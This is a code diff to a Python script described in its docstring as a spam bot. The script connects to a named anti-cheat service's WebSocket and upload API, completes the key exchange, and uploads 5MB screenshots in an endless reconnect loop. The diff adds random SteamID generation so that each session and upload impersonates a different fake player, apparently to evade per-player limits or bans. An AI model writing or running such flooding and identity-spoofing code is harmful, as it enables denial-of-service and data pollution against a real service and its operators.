@@ -4,12 +4,16 @@ RustSecure screenshot spam bot with auto-reconnect.
 ~40s session window → 4x 5MB uploads → reconnect → repeat forever.
 """
 
-import asyncio, json, base64, time, os, subprocess, sys, hashlib, hmac
+import asyncio, json, base64, time, os, subprocess, sys, hashlib, hmac, random
 
 try:
     import websockets, requests
 except ImportError:
     print("pip install websockets requests"); sys.exit(1)
+
+
+def random_steamid():
+    return str(76561197960265728 + random.randint(1, 500_000_000))
 
 WS_URL = "wss://rustsecure.ru/ws"
 UPLOAD_URL = "https://rustsecure.ru/api/ingest/screenshot"
@@ -74,6 +78,7 @@ def spam_upload(steam_id, png_data):
 
 async def single_session(steam_id, png_data, crypto, stats):
     """One WS session: connect, spam until disconnect. Returns normally."""
+    sid = random_steamid()
     ph, pubh = crypto.genkey()
     pub_b64 = b64e(bytes.fromhex(pubh))
     nonce = os.urandom(16); nonce_b64 = b64e(nonce)
@@ -93,18 +98,18 @@ async def single_session(steam_id, png_data, crypto, stats):
             shared = crypto.ecdh(ph, b64d(resp["pub"]).hex())
             crypto.derive(shared, nonce.hex(), b64d(resp["nonce"]).hex())
 
-            pc = json.dumps({"type": "PlayerConnected", "steamId": steam_id,
+            pc = json.dumps({"type": "PlayerConnected", "steamId": sid,
                              "playerName": "Bot", "hwids": {}})
             await ws.send(crypto.protect(pc))
             stats["sessions"] += 1
             now = time.strftime("%H:%M:%S")
-            print(f"[{now}] Session #{stats['sessions']} connected")
+            print(f"[{now}] Session #{stats['sessions']} as {sid}")
 
             # Spam uploads as fast as possible during the ~40s window
             async def spam():
                 while True:
                     await asyncio.sleep(8)
-                    code, body = spam_upload(steam_id, png_data)
+                    code, body = spam_upload(random_steamid(), png_data)
                     stats["uploads"] += 1
                     stats["bytes"] += len(png_data)
                     mb = stats["bytes"] / 1024 / 1024
